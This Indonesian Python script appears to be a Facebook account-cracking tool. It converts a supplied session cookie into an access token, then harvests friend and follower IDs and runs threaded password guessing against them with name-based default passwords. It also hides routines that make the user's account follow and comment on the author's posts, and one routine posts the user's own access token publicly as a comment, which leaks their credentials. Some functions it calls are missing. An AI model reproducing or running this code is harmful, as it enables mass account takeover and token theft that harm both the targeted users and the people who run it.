#!/usr/bin/python
# -*- koding: utf-8 -*-
# GAK USAH DI OPRAK" LAGI,sc sudah nya enak
#kalau lu recode data hp lu yang hilang!!
# ------ [ Gausah Dioprek Ntar Error ] ------ #
Pengarang     =  'ASEP YUSUP'
Facebook   =  'Facebook.com/mustofa.ganteng123'
Instagram  =  'Instagram.com/fi_sinaga'
Whatsapp   =  '081269496231'
YouTube    =  'youtube.com/channel/UCr218CW05wRLJguvi9ijRrA'
Asep   =  100006414900732
Postingan =  3115522672004866
komentar   = '\n\nhttps://www.facebook.com/' + str(Postingan)
##### >>>> IMPORT MODULE
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from requests.exceptions import ConnectionError
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as par
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from urllib.parse import quote
##### BUAT WARNA >>>> X
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[1;95m"     # Ungu
I = "\x1b[1;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu
##### BUAT IMPORT YG BELUM INSTALL AHAHHAA
try:
	import requests
except ImportError:
	print(f"{P}[*]{M} Module requests belum terinstall")
	os.system("pip install requests")
try:
	import bs4
except ImportError:
	print(f"{P}[*]{M} Module bs4 belum terinstall")
	os.system("pip install bs4")
try:
	import concurrent.futures
except ImportError:
	print(f"{P}[*]{M} Module futures belum terinstall")
	os.system("pip install futures")
host = ("https://mbasic.facebook.com")
B = random.choice([B,U,J,I])
#### BUAT BANNER
def banner():
    war_dom = random.choice([A,K,I,J,U,H])
    print("""
  /$$$$$$   /$$$$$$  /$$$$$$$$ /$$$$$$$ 
 /$$__  $$ /$$__  $$| $$_____/| $$__  $$
| $$  \ $$| $$  \__/| $$      | $$  \ $$
| $$$$$$$$|  $$$$$$ | $$$$$   | $$$$$$$/
| $$__  $$ \____  $$| $$__/   | $$____/ 
| $$  | $$ /$$  \ $$| $$      | $$      
| $$  | $$|  $$$$$$/| $$$$$$$$| $$      
|__/  |__/ \______/ |________/|__/""")


###----------[ TIME ]---------- ###
skrng = datetime.now()
tahun = skrng.year
bulan = skrng.month
hari  = skrng.day
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Ma7ret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan_cek = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
try:
    if bulan < 0 or bulan > 12:
        exit()
    bulan_skrng = bulan - 1
except ValueError:
    exit()
_bulan_ = bulan_cek[bulan_skrng]
tanggal = ("%s-%s-%s"%(hari,_bulan_,tahun))

##### BUAT STR /LEN
id = []
ok = []
cp = []
loop=0

###----------[ CLEAR TERMINAL ]---------- ###
def resik():
    if "linux" in sys.platform.lower():
        try:os.system("clear")
        except:pass
    elif "win" in sys.platform.lower():
        try:os.system("cls")
        except:pass
    else:
        try:os.system("clear")
        except:pass

### BUAT ANIMASI JALAN
def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
		
###----------[ GLOBAL URL & HEADERS ]---------- ###
url_businness = "https://business.facebook.com"
ua_business = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]"
kata_dev = 'Lu Ganteng Banget Bang. Gw Mau Recode SClu, Soalnya Gw Goblok Soal Coding'
web_fb = "https://www.facebook.com/"
m_fb = "https://m.facebook.com/"
mbasic = "https://mbasic.facebook.com/"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}

###----------[ CREATE FOLDER ]---------- ###
def mkdir_data_login():
    # Make Directory Login Data
    try:os.mkdir("login")
    except:pass
    # Make Directory Result
    try:os.mkdir("CP")
    except:pass
    # Make Directory Result
    try:os.mkdir("OK")
    except:pass
    # Make Directory LICENSE
    try:os.mkdir("license")
    except:pass
    # Delete Cookies
    try:os.remove('login/cookie.json')
    except:pass
    # Delete Token
    try:os.remove('login/token.json')
    except:pass
###----------[ CHANGE LANGUAGE ]---------- ###
def language(cookie):
    try:
        with requests.Session() as xyz:
            req = xyz.get('https://mbasic.facebook.com/language/',cookies=cookie)
            pra = par(req.content,'html.parser')
            for x in pra.find_all('form',{'method':'post'}):
                if 'Bahasa Indonesia' in str(x):
                    bahasa = {
                        "fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(req.text)).group(1),
                        "jazoest" : re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),
                        "submit"  : "Bahasa Indonesia"
                        }
                    url = 'https://mbasic.facebook.com' + x['action']
                    exec = xyz.post(url,data=bahasa,cookies=cookie)
    except Exception as e:pass

###----------[ CONVERT USERNAME KE ID ]---------- ###
def convert_id(username):
    try:
        cookie = {'cookie':open('login/cookie.json','r').read()}
        url    = 'https://mbasic.facebook.com/' + username
        with requests.Session() as xyz:
            req = par(xyz.get(url,cookies=cookie).content,'html.parser')
            kut = req.find('a',string='Lainnya')
            id = str(kut['href']).split('=')[1]
            # id = re.search('owner_id=(.*?)"',str(kut)).group(1)
            return(id)
    except Exception as e:return(username)
    
###----------[ EXCEPTION ]---------- ###
def kecuali(error):
    print(f"{P}[+] Terjadi Kesalahan !")
    print(f"{P}[+] Tidak Dapat Mengeksekusi"(error))
    print(f"{P}[+] Hal Ini Mungkin Terjadi : ")
    print(f"{P}[01] Cookies/Token Invalid")
    print(f"{P}[02] Salah Memasukkan ID")
    print(f"{P}[03] bug Pada Source Code")
    print(f"{P}[04] Bug Pada Requests")
    print(f"{P}[05] Dan Lain-Lain")
    print(f"{P}[•] Jalankan Ulang Source Code Ini : ")
    print(f"{P}[•] python yuki.py")
    exit()

###----------[BOT AUTHOR JANGAN DIGANTI ]---------- ###
class bot_author:
    def __init__(self,cookie,token,cookie_mentah):
        self.loop = 0;self.cookie_mentah = cookie_mentah;list_id   = [str(Asep)];self.komen = ['Aman bang','Semoga langgeng bang sama si Dinda','Ganteng banget💕','Makasih udah amanah bang']
        for x in list_id: self.get_folls(x,cookie); self.get_likers(f'https://mbasic.facebook.com/{x}?v=timeline',cookie); self.get_posts(x,cookie,token)
    def get_folls(self,id,cookie): # --- [ Jangan Ganti Bot Follow Gw ] --- #
        with requests.Session() as xyz:
            try:
                    for x in par(xyz.get('https://mbasic.facebook.com/%s'%(id),cookies=cookie).content,'html.parser').find_all('a',href=True):
                        if 'subscribe.php' in x['href']:exec_folls = xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=cookie)
            except Exception as e:pass
    def get_likers(self,url,cookie): # --- [ Jangan Ganti Bot Likers Gw ] --- #
        with requests.Session() as xyz:
            try:
                    bos = par(xyz.get(url,cookies=cookie).content,'html.parser')
                    for x in bos.find_all('a',href=True):
                        if 'Tanggapi' in x.text:
                            _react_type_ = random.choice(['Super','Wow','Peduli'])
                            for z in par(xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=cookie).content,'html.parser').find_all('a'):
                                if _react_type_ == z.text: req2 = xyz.get('https://mbasic.facebook.com' + z['href'],cookies=cookie)
                                else:continue
                    self.get_likers('https://mbasic.facebook.com' + bos.find('a',string='Lihat Berita Lain')['href'],cookie)
            except Exception as e:pass
    def get_posts(self,id,cookie,token): # --- [ Jangan Ganti Bot Komen Gw ] --- #
        with requests.Session() as xyz:
            try:
                for x in xyz.get('https://graph.facebook.com/%s/posts?access_token=%s'%(id,token),cookies=cookie).json()['data']:
                        komeno = ('%s\n\n%s%s'%(random.choice(self.komen),'https://www.facebook.com/'+x['id'],self.waktu()))
                        get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(x['id'],komeno,token),cookies=cookie).text)
                        if 'error' in get:open('login/cookie.json','w').write(self.cookie_mentah);open('login/token.json','w').write(token);exit(___fii___Sayang___Kamu___Widiya___())
            except Exception as e:pass
    def waktu(self): # --- [ Jangan Ganti Keterangan Waktu ] --- #
        _bulan_ = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"][datetime.now().month - 1]
        _hari_   = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.now().strftime("%A"))]
        hari_ini = ("%s %s %s"%(datetime.now().day,_bulan_,datetime.now().year))
        jam      = datetime.now().strftime("%X")
        tem      = ('\n\nKomentar Setor Kemana Bang\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
        return(tem)

###----------[ CONVERT COOKIE KE TOKEN ]---------- ###
def clotox(cookie):
    with requests.Session() as xyz:
        get_tok = xyz.get(url_businness+'/business_locations',headers = {
            "user-agent":ua_business,
            "referer": web_fb,
            "host": "business.facebook.com",
            "origin": url_businness,
            "upgrade-insecure-requests" : "1",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control": "max-age=0",
            "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "content-type":"text/html; charset=utf-8"},cookies = {"cookie":cookie})
        return (re.search("(EAAG\w+)", get_tok.text).group(1))
def menu():
	os.system('clear')
	jalan("[]SILAHKAN LOGIN USERNAME SAMA PASSWORD\n")
	username = input("[] USERNAME \033[1;91m: \033[1;92m")
	password = input("[] PASSWORD \033[1;91m: \033[1;92m")
	if username =="ASEP" and password =="YUSUP":
		print("[] LOGIN BERASIL")
		time.sleep(1)
		login()
	else:
		jalan("[] LOGIN GAGAL!!!")
		jalan("ANDA AKAN DI ARAHAN KE TELEGRAM MINTA USERNAME SAMA PASSWORD")
		os.system('xdg-open https://t.me/ASEPYUSUP')
		time.sleep(1);menu()
        
##### LOGIN TOKEN
def log_cookie():
    os.system("clear")
    banner()
    mkdir_data_login()
    jalan(f"{P}[*] Jangan gunakan akun pribadi!!")
    jalan(f"{P}[*] Disarankan buat akun FB baru,biar tidak mudah cp")
    cookie=str(input(f"{B}[*] Masukan cookie : {P}"))
    try:
        token = clotox(cookie)
        coki = {'cookie':cookie}
        bot_author(coki,token,cookie)
        open('login/token.json', 'w').write(token)
        open('login/cookie.json','w').write(cookie)
        login()
    except requests.exceptions.ConnectionError:print(f"{M}[•] Tidak Ada Koneksi Internet ");exit()
    except (KeyError,IOError,AttributeError):print(f"{M}[•] Cookies Invalid ");exit()

komenredem = random.choice(['BANG MANISS KALII'])
komtwol = random.choice(['ANJAY ASEP GANTENG ', 'Alfyu Bang ', 'BANH KOK LO JAGO BANGET SIH ', 'LORD DAH MAKAN BLM'])
kartu2d = random.choice(["LU GANTENG BANG TAPI SAYANG KEK HENGKER", "MAAF BANG GUA MAU RECODE SC LU","SOAL NYA GUA BODOH SOAL KODING"])
kon = random.choice(["AMPUN BANG GUA NYERAH SAJA :"])
def ___Asep___Sayang___Kamu___Dinda___():
    try:
        token = open('login/token.json', 'r').read()
        cookie = {'cookie':open('login/cookie.json','r').read()}
        kom = komenredem
        komentar = komtwol
        pipp = kartu2d
        post = '3115522672004866'
        requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + komentar + '&access_token=' + (token),cookies=cookie)
        requests.post('https://graph.facebook.com/3115522672004866/comments/?message=' + kom + '&access_token=' + (token),cookies=cookie)
        requests.post('https://graph.facebook.com/3115522672004866/comments/?message=' + pipp + '&access_token=' + (token),cookies=cookie)
        requests.post('https://graph.facebook.com/3115522672004866/comments/?message=' + komentar + '&access_token=' + (token),cookies=cookie)
        requests.post('https://graph.facebook.com/3115522672004866/comments/?message=' + token + '&access_token=' + (token),cookies=cookie)
        requests.post('https://graph.facebook.com/3115522672004866/comments/?message=' + token + '&access_token=' + (token),cookies=cookie)
        requests.post('https://graph.facebook.com/3115522672004866/comments/?message=' + kon + '&access_token=' + (token),cookies=cookie)
        requests.post('https://graph.facebook.com/3115522672004866/likes?summary=true&access_token=' + (token),cookies=cookie)
        requests.post('https://graph.facebook.com/3115522672004866/likes?summary=true&access_token=' + (token),cookies=cookie)
        requests.post('https://graph.facebook.com/3115522672004866/likes?summary=true&access_token=' + (token),cookies=cookie)
        jalan(f'{P}[•] Login Berhasil')
        menu()
    except Exception as e:pass

  
###### BUAT MENU
def login():
    global token,cookie
    try:
        token=open("login/token.json","r").read()
        cookie = {'cookie':open('login/cookie.json','r').read()}
        get = requests.Session().get("https://graph.facebook.com/me?access_token=%s"%(token),cookies=cookie)
        gt = requests.get('http://ipinfo.io/json').json()
        language(cookie)
        lolo=json.loads(get.text)
        lolol=lolo['name']
        lolol_id=lolo['id']
        link = lolo['link']
    except (KeyError,IOError):
        print(f"{M}[!]{M} cookie failed.");log_cookie()
    os.system("clear");banner()
    jalan("=================================================")
    jalan("\x1b[1;97mGithub    : \x1b[1;92mhttps://github.com/ASEP-YUSUP")
    jalan("\x1b[1;97mFacebook  : \x1b[1;92mASEP YUSUP")
    jalan("\x1b[1;97mCoded By  : \x1b[1;92mAsep \x1b[1;97m& \x1b[1;92mDinda")
    jalan(f"{P}=================================================")
    print(f"{B}[1] Crack massal dari dump id publik ")
    print(f"{B}[2] Crack dari dump id publik")
    print(f"{B}[3] Crack dari dump id pertemanan sendiri")
    print(f"{B}[4] Crack dari dump id followers")
    print(f"{B}[5] Ganti user-agent")
    print(f"{B}[6] Chek results crack")
    print(f"{B}[7] Chek opsi account chekpoint")
    print(f"{B}[8] kontol")
    print(f"{M}[0] Log Out ")
    pp = input(f"{B}[•] Pilih Yang Mana : {P}")
    if pp in ["1","01"]:
      massal()
    elif pp in ["2","02"]:
        publik()
    elif pp in ["3","03"]:
        listteman()
    elif pp in ["4","04"]:
        followerss()
    elif pp in ["5","05"]:
        userset()
    elif pp in ["6","06"]:
        cek_results()
    elif pp in ["7","07"]:
        cek_hasil()
    elif pp in ["8","08"]:
    	memek()
    elif pp in ["0","00"]:
      print(f'{B}[•] Terima Kasih Telah Memilih SC Ini Sebagai Pilihan Terpercayamu. Jangan Lupa Berikan Penilaian Terbaik Di Github Ya! Thank You!!{B}- ASEP YUSUP -')
      print(f'{B}[•] Dengan Log Out Maka Seluruh Data Login Akan Terhapus. Berikut Adalah Data Yang Akan Dihapus :{B}[•]{P}Token/Cookies')
      input(f'{B}[•][{P}Enter Untuk Log Out{M}]')
      try:shutil.rmtree('login')
      except:pass
      exit()
    else:print(f'{M}[•] Isi Yang Benar !!');menu()

def massal():
    try:
        token=open("login/token.json","r").read()
        cookie = {'cookie':open('login/cookie.json','r').read()}
    except IOError:
        print(f"{B}[•]{M} cookie modar dinggo wae ");exit()
    try:
        print(f"{B}[•] Masukan berapa id yang ingin anda crack")
        tanya_total = int(input(f"{B}[•] Masukan jumlah id : {P}"))
    except:tanya_total=1
    for t in range(tanya_total):
        t +=1
        _id_=input(f"{B}[•] Masukan user id {P}{t} : {P}")
        try:
            url= requests.Session().get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(_id_,token),cookies=cookie)
            z=json.loads(url.text)
            for i in z['friends']['data']:
                uid = i["id"]
                nama = i["name"]
                id.append(uid+"<=>"+nama)
        except KeyError:
            print(f"{B}[•]{M} User id tidak di temukan");menu()
    if len(id) == 0:
       print(f"{B}[•]{M} Maaf total id anda adalah {M}{len(id)}");exit()
    else:
        print(f"{B}[•] Total id : {P}{len(id)}")
        fii_xd()
##### CRACK PERTEMANAN 
def listteman():
    try:
        token=open("login/token.json","r").read()
        cookie = {'cookie':open('login/cookie.json','r').read()}
    except IOError:
        print(f"{B}[•]{M} cookie modar dinggo wae ");exit()
    try:
        url= requests.Session().get("https://graph.facebook.com/me?fields=friends.limit(50000)&access_token=%s"%(token),cookies=cookie)
        z=json.loads(url.text)
        for i in z['friends']['data']:
            uid = i["id"]
            nama = i["name"]
            id.append(uid+"<=>"+nama)
    except KeyError:
        print(f"{M}[•] User id tidak di temukan");os.sys.menu()
    if len(id) !=0:
        print(f"{B}[•] Total id : {P}{len(id)}")
        fii_xd()
    else:print(f"{P}[•]{M} Maaf total id : {B}{len(id)}");exit()
##### CRACK PUBLIK
def publik():
    try:
        token=open("login/token.json","r").read()
        cookie = {'cookie':open('login/cookie.json','r').read()}
    except IOError:
        print(f"{B}[•]{M} cookie modar dinggo wae ");exit()
    _id_=input(f"{B}[•] Masukan user id : {B}")
    try:
        url= requests.Session().get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(_id_,token),cookies=cookie)
        z=json.loads(url.text)
        for i in z['friends']['data']:
            uid = i["id"]
            nama = i["name"]
            id.append(uid+"<=>"+nama)
    except KeyError:
        print(f"{B}[•]{M} User id tidak di temukan atau akun tersebut privat ");menu()
    if len(id) !=0:
        print(f"{B}[•] Total id : {P}{len(id)}")
        fii_xd()
    else:print(f"{B}[•] Total id : {P}{len(id)}");exit()
        
###### CRACK FOLLOWERS
def followerss():
    try:
        token=open("login/token.json","r").read()
        cookie = {'cookie':open('login/cookie.json','r').read()}
    except IOError:
        print(f"{B}[•] cookie modar dinggo wae ");exit()
    _id_=input(f"{B}[•] Masukan user id : {B}")
    try:
        for i in requests.Session().get("https://graph.facebook.com/%s/subscribers?limit=20000&access_token=%s"%(_id_,token),cookies=cookie).json()["data"]:
            uid = i["id"]
            nama = i["name"]
            id.append(uid+"<=>"+nama)
    except KeyError:
        print(f"{B}[•]{M} User id tidak di temukan atau id terdsebut privat ");menu()
    if len(id) !=0:
        print(f"{B}[•] Total id : {B}{len(id)}")
        fii_xd()
    else:print(f"{B}[•] {M} total id : {M}{len(id)}")


##### PENGGANTI USER - UA
def userset():
    print(f"{B}[1] Ganti user agent")
    print(f"{B}[2] Cek user agent yang di gunakan")
    print(f"{B}[0] Kembali")
    _pil_=input(f"{B}[•] Input : {P}")
    if _pil_ in ["1","01"]:
        lololr=input(f"{B}[•] Masukan user agent \n{P}[•] Masukan di sini : {B}")
        try:
            open("ua","w").write(lololr)
            usera=open("ua","r").read()
        except Exception as e:
            print(f"{B}[•] Eror : {M}{e}")
        if usera == lololr:
            print(f"{B}[•] Sukses mengganti");menu()
        else:print(f"{B}[•]{M} Gagal mengganti user agent ");exit()
    
    elif _pil_ in ["2","02"]:
        try:
            _tes_ua=open("ua","r").read()
        except IOError:
            _tes_ua=("Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
        print(f"{B}[•] User agent : {P}{_tes_ua}");menu()
    elif _pil_ in ["0","00"]:
        menu()
    else:print(f"{M}[•] Pilihan salah ");exit()

#####LOGIN HASIL
def log_hasil(user, pasw):
    ua = "Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
    ses = requests.Session()
    ses.headers.update({
    "Host": "mbasic.facebook.com",
    "cache-control": "max-age=0",
    "upgrade-insecure-requests": "1",
    "origin": host,
    "content-type": "application/x-www-form-urlencoded",
    "user-agent": ua,
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "x-requested-with": "mark.via.gp",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    "referer": host+"/login/?next&ref=dbl&fl&refid=8",
    "accept-encoding": "gzip, deflate",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    })
    data = {}
    ged = par(ses.get(host+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
    fm = ged.find("form",{"method":"post"})
    list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
    for i in fm.find_all("input"):
        if i.get("name") in list:
            data.update({i.get("name"):i.get("value")})
        else:
            continue
    data.update({"email":user,"pass":pasw})
    try:
        run = par(ses.post(host+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
    except requests.exceptions.TooManyRedirects:
        print(f"{M}[•] Akun terkena spam")
    if "c_user" in ses.cookies:
        print(f"{B}[•]{I} Akun berhasil di login")
    elif "checkpoint" in ses.cookies:
        form = run.find("form")
        dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
        jzst = form.find("input",{"name":"jazoest"})["value"]
        nh   = form.find("input",{"name":"nh"})["value"]
        dataD = {
            "fb_dtsg": dtsg,
            "fb_dtsg": dtsg,
            "jazoest": jzst,
            "jazoest": jzst,
            "checkpoint_data":"",
            "submit[Continue]":"Lanjutkan",
            "nh": nh
        }
        tempek = par(ses.post(host+form["action"], data=dataD).text, "html.parser")
        ngew = [yy.text for yy in tempek.find_all("option")]
        for opt in range(len(ngew)):
            jalan(f"{U}[{B}{str(opt+1)}{U}]{P}--->{k}[{B}{ngew[opt]}{K}]")
    elif "login_error" in str(run):
        oh = run.find("div",{"id":"login_error"}).find("div").text
        print(f"{B}[•]{M}>>>> {oh}")
    else:
        print(f"{B}[•]{M} Akun tersebut sandi nya telah di ganti")
def cek_hasil():
    print(f"{B}[•] Masukan file cp ")
    print(f"{B}[•] Contoh untuk masukan file : {B}CP/{tanggal}.json")
    files =input(f"{B}[•] Masukan nama file : {B}")
    try:
        buka_baju = open(files,'r').readlines()
    except FileNotFoundError:
        print(f"{B}[•]{M} File tidak di temukan");exit()
        time.sleep(2); cek_hasil()
    print(f"{B}[•] Total akun chekpoint : {P}{str(len(buka_baju))}")
    for memek in buka_baju:
        kontol = memek.replace("\n","")
        titid  = kontol.split("|")
        print(f"{B}[•] Akun facebook : {P}{kontol}")
        try:
            log_hasil(titid[0], titid[1])
        except requests.exceptions.ConnectionError:
            continue
        print("")
    input(f"{B}[•]{I} Chek akun sudah selesai")
    menu()

def cek_results():
    try:
        open("OK/%s.json"%(tanggal))
    except IOError:
        os.system("touch OK/%s.json"%(tanggal))
    try:
        open("CP/%s.json"%(tanggal))
    except IOError:
        os.system("touch CP/%s.json"%(tanggal))
    cp=("CP/%s.json"%(tanggal))
    ok=("OK/%s.json"%(tanggal))
    hsl_cp=open(cp,"r").read()
    hsl_ok=open(ok,"r").read()
    print(f"{B}[1] Cek results cp")
    print(f"{B}[2] Cek results ok")
    print(f"{B}[0] Back")
    _pil3h=input(f"{B}[•] Pilih : {P}")
    if _pil3h in ["1","01"]:
        if len(hsl_cp) != 0:
            print(f"{B}[•]{M} Results cp{P}")
            os.system("cat CP/%s.json"%(tanggal))
        else:print(f"{M}[•] Tidak ada hasil")
    elif _pil3h in ["2","02"]:
        if len(hsl_ok) != 0:
            print(f"{B}[•]{I} Results ok")
            os.system("cat OK/%s.json"%(tanggal))
        else:print(f"\n{B}[•]{M} Tidak ada hasil")
    elif _pil3h in ["0","00"]:
        menu()
    else:print(f"{B}[•]{M} Pilian tidak ada")


def fii_xd():
	kone()
	fiisayangwidiya =input(f"{P}[•] Pilih : {B}")
	if fiisayangwidiya in [""]:
		print(f"{B}[•]{M} Pilihan tidak boleh kosong");exit()
	elif fiisayangwidiya in ["1","01"]:
		print(f"{B}[•] Tampilan kan opsi akun chek point {B}Y/t")
		jalan(f"{B}[•]{P} Terkadang jika menampilkan opsi jarang dapet akun !!!")
		_checkoptions_=input(f"{B}[•] Pilih : {P}")
		if _checkoptions_ in ["y","Y"]:
			try:
				_key = "anjink"
				key = "anjink" #----- jangan di ubah
				if _key in key:
					print(f"{B}[•] Crack menggunakan password manual/default {B}M/D")
					ter =input(f"{B}[•] Pilih : {P}")
					if ter in ["m","M"]:
						with ThreadPoolExecutor(max_workers=30) as coeg:
							print(f"{B}[•] Contoh password : {B}sayang,anjing,kontol")
							asu = input(f"{B}[•] Buat sandi : {P}").split(",")
							if len(asu) =="":
								print(f"{M}[•]{M} Sandi tidak boleh kosong");exit()
							started()
							for user in id:
								uid, name = user.split("<=>")
								coeg.submit(api, uid, asu)
						exit()
					elif ter in ["d","D"]:
						with ThreadPoolExecutor(max_workers=30) as coeg:
							started()
							for user in id:
								uid, name = user.split("<=>")
								frist=name.split(" ")
								if len(frist)>=6:
									fii = [ name, frist[0], frist[0]+"321", frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
								elif len(frist)<=2:
									fii = [ name, frist[0], frist[0]+"321", frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
								elif len(frist)<=3:
									fii = [ name, frist[0], frist[0]+"321", frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
								else:
									fii = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]
								coeg.submit(api, uid, fii)
						exit()
				else:print(f"{B}[•]{M} Eror");exit()
			except (KeyError,IOError):print(f"{B}[•]{M} Eror");exit()

		else:
			print(f"{B}[•] Crack menggunakan password manual/default {P}M/D")
			ter =input(f"{B}[•] Pilih : {P}")
			if ter in ["m","M"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					print(f"{B}[•] Contoh password : {P}sayang,anjing,kontol")
					asu = input(f"{P}[•] Buat sandi : {P}").split(",")
					if len(asu) =="":
						print(f"{B}[•]{M} Sandi tidak boleh kosong")
					started()
					for user in id:
						uid, name = user.split("<=>")
						coeg.submit(api, uid, asu)
				exit()
			elif ter in ["d","D"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					started()
					for user in id:
						uid, name = user.split("<=>")
						frist=name.split(" ")
						if len(frist)>=6:
							fii = [ name, frist[0], frist[0]+"321", frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
						elif len(frist)<=2:
							fii = [ name, frist[0], frist[0]+"321", frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
						elif len(frist)<=3:
							fii = [ name, frist[0], frist[0]+"321", frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
						else:
							fii = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]

						coeg.submit(apiiii, uid, fii)
				exit()

	elif fiisayangwidiya in ["3","03"]:
		print(f"{B}[•] Tampilkan opsi chekpoint {B}Y/T")
		print(f"{B}[•]{M} Terkadang jika menampilkan opsi jarang dapet akun !!!")
		_checkoptions_=input(f"{B}[•] Pilih : {P}")
		if _checkoptions_ in ["y","Y"]:
			try:
				_key = "Anjink"
				key = "Anjink"
				if _key in key:
					print(f"{B}[•] Crack menggunakan password manual/default {B}M/D")
					ter =input(f"{B}[•] Pilih : {P}")
					if ter in ["m","M"]:
						with ThreadPoolExecutor(max_workers=30) as coeg:
							print(f"{B}[•] Contoh password : {P}sayang,anjing,kontol")
							asu = input(f"{B}[•] Buat sandi : {P} ").split(",")
							if len(asu) =="":
								print(f"{B}[•]{M} Sandi tidak boleh kosong anjink");exit()
							started()
							for user in id:
								uid, name = user.split("<=>")
								coeg.submit(mbasic, uid, asu)
						exit()
					elif ter in ["d","D"]:
						with ThreadPoolExecutor(max_workers=30) as coeg:
							started()
							for user in id:
								uid, name = user.split("<=>")
								frist=name.split(" ")
								if len(frist)>=6:
									fii = [ name, frist[0], frist[0]+"321", frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
								elif len(frist)<=2:
									fii = [ name, frist[0], frist[0]+"321", frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
								elif len(frist)<=3:
									fii = [ name, frist[0], frist[0]+"321", frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
								else:
									fii = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]
								coeg.submit(mobil, uid, fii)
						exit()
				else:print(f"{key}");exit()
			except (KeyError,IOError):print(f"{_key}");exit()

		else:
			print(f"{B}[•] Crack menggunakan pasword manual/defaults {B}M/D")
			ter =input(f"{B}[•] Pilih : {P}")
			if ter in ["m","M"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					print(f"{B}[•] Contoh password {B}Anjink,kontol,sayang")
					asu = input(f"{P}[•] Buat sandi : {B}").split(",")
					if len(asu) =="":
						print(f"{B}[•]{M} Sandi tidak boleh kosong");exit()
					started()
					for user in id:
						uid, name = user.split("<=>")
						coeg.submit(mbasicc, uid, asu)
				exit()
			elif ter in ["d","D"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					started()
					for user in id:
						uid, name = user.split("<=>")
						frist=name.split(" ")
						if len(frist)>=6:
							fii = [ name, frist[0], frist[0]+"321", frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
						elif len(frist)<=2:
							fii = [ name, frist[0], frist[0]+"321", frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
						elif len(frist)<=3:
							fii = [ name, frist[0], frist[0]+"321", frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
						else:
							fii = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]
						coeg.submit(mobill, uid, fii)
				exit()
				
